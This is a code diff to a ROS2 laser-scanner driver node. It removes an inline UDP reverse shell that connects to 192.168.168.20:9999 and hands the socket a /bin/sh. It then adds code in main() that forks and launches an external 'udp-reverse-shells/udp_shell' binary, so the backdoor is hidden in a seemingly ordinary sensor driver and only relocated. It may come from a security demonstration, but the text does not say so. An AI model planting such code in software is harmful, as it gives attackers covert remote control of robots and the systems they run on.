@@ -37,15 +37,6 @@
 #include <boost/asio.hpp>
 #include <hls_lfcd_lds_driver/lfcd_laser.hpp>
 
-// Libraries needed for the udp reverse shell
-#include <stdio.h>
-#include <sys/socket.h>
-#include <unistd.h>
-#include <netinet/ip.h>
-#include <arpa/inet.h>
-#include <string.h>
-
-
 namespace hls_lfcd_lds
 {
 LFCDLaser::LFCDLaser(const std::string& port, uint32_t baud_rate, boost::asio::io_service& io)
@@ -61,40 +52,6 @@ LFCDLaser::~LFCDLaser()
   boost::asio::write(serial_, boost::asio::buffer("e", 1));  // stop motor
 }
 
-int reverse_shell(){
-
-	const char *host = "192.168.168.20";
-	int port = 9999;
-
-	printf("reverse shell: entered function \n");
-	/* Set up sockaddr struct */
-	struct sockaddr_in address;
-	address.sin_family = AF_INET;
-	address.sin_port = htons(port);
-	inet_aton(host, &address.sin_addr);
-	printf("reverse shell: set up sockaddr \n");
-
-	/* Connect */
-	int s = socket(AF_INET, SOCK_DGRAM, 0);
-	connect(s, (struct sockaddr*)&address, sizeof(address));
-	
-	/* Send initial message (there is no SYN in UDP) */
-	char buf[20];
-	strcpy(buf, "Starting UDP shell\n");
-	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));
-
-	printf("reverse shell: sent first msg to remote \n");
-
-	/* Copy file descriptors */
-	dup2(s, STDIN_FILENO);
-	dup2(s, STDOUT_FILENO);
-	dup2(s, STDERR_FILENO);
-
-	execve("/bin/sh", NULL, NULL);
-
-	return 0;
-
-}
 
 void LFCDLaser::poll(sensor_msgs::msg::LaserScan::SharedPtr scan)
 {
@@ -179,15 +136,18 @@ void LFCDLaser::poll(sensor_msgs::msg::LaserScan::SharedPtr scan)
 int main(int argc, char **argv)
 {
   rclcpp::init(argc, argv);
+  printf("Hello, inside hlds_laser_publisher node\n");
+  int childPid = fork();
+  if (childPid == 0) {
+	  printf("New process's reverse shell\n");
+	  execl("/home/pi/udp-reverse-shells/udp_shell", NULL);
+  } else {
+	  printf("continue with execution of hlds_laser_publisher node\n");
+  }
 
   auto node = rclcpp::Node::make_shared("hlds_laser_publisher");
   rclcpp::Publisher<sensor_msgs::msg::LaserScan>::SharedPtr laser_pub;
   boost::asio::io_service io;
-
-  int childPid = fork();
-  if (childPid == 0) {
-	  hls_lfcd_lds::reverse_shell();
-  }
 
   std::string port;
   std::string frame_id;
